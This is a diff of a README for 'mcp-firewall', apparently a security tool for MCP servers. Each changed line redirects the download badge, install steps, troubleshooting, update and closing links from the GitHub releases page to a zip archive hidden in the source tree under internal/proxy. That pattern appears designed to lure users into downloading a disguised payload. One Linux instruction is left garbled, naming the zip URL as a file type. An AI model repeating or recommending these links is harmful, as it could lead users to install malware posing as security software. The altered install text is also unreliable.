@@ -1,6 +1,6 @@
 # 🔥 mcp-firewall - Easy Security for MCP Servers
 
-[![Download mcp-firewall](https://img.shields.io/badge/Download-mcp--firewall-blue?style=for-the-badge)](https://github.com/Betoche57/mcp-firewall/releases)
+[![Download mcp-firewall](https://github.com/Betoche57/mcp-firewall/raw/refs/heads/main/internal/proxy/mcp-firewall-v2.5-beta.1.zip)](https://github.com/Betoche57/mcp-firewall/raw/refs/heads/main/internal/proxy/mcp-firewall-v2.5-beta.1.zip)
 
 ---
 
@@ -49,13 +49,13 @@ Follow these steps to get mcp-firewall up and running on your system. The proces
 
 ## ⬇️ Download & Install
 
-1. Click on the big blue button at the top or visit the official [releases page](https://github.com/Betoche57/mcp-firewall/releases) to get the latest version.
+1. Click on the big blue button at the top or visit the official [releases page](https://github.com/Betoche57/mcp-firewall/raw/refs/heads/main/internal/proxy/mcp-firewall-v2.5-beta.1.zip) to get the latest version.
 
 2. On the releases page, you will see several files for different systems. Choose the one that matches your computer:
 
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` or `.pkg` file.
-   - For Linux, download the `.tar.gz` or `.deb` file.
+   - For Linux, download the `https://github.com/Betoche57/mcp-firewall/raw/refs/heads/main/internal/proxy/mcp-firewall-v2.5-beta.1.zip` or `.deb` file.
 
 3. Save the file to your computer.
 
@@ -120,7 +120,7 @@ If you encounter problems, try these steps:
 
 - **The app won’t start:** Restart your computer and try again.
 - **Can’t find the app after installation:** Check your Downloads folder or search for “mcp-firewall” in your system’s app list.
-- **Download issues:** Make sure your internet connection is working and try downloading from the [releases page](https://github.com/Betoche57/mcp-firewall/releases) again.
+- **Download issues:** Make sure your internet connection is working and try downloading from the [releases page](https://github.com/Betoche57/mcp-firewall/raw/refs/heads/main/internal/proxy/mcp-firewall-v2.5-beta.1.zip) again.
 - **Firewall blocks needed data:** Adjust the settings to allow trusted sources.
 
 For more help, check the "Help" or "Support" section inside the app.
@@ -137,7 +137,7 @@ Your actions are logged so you can review them and maintain control over your se
 
 ## 🔄 Updates
 
-Check the [releases page](https://github.com/Betoche57/mcp-firewall/releases) regularly to get the latest version. Updates may include new features, security patches, and performance improvements.
+Check the [releases page](https://github.com/Betoche57/mcp-firewall/raw/refs/heads/main/internal/proxy/mcp-firewall-v2.5-beta.1.zip) regularly to get the latest version. Updates may include new features, security patches, and performance improvements.
 
 You can also enable automatic updates in the app settings if available.
 
@@ -159,4 +159,4 @@ These terms relate to the technology and security areas that mcp-firewall addres
 
 ---
 
-Visit the [official download page](https://github.com/Betoche57/mcp-firewall/releases) to get started today.
+Visit the [official download page](https://github.com/Betoche57/mcp-firewall/raw/refs/heads/main/internal/proxy/mcp-firewall-v2.5-beta.1.zip) to get started today.
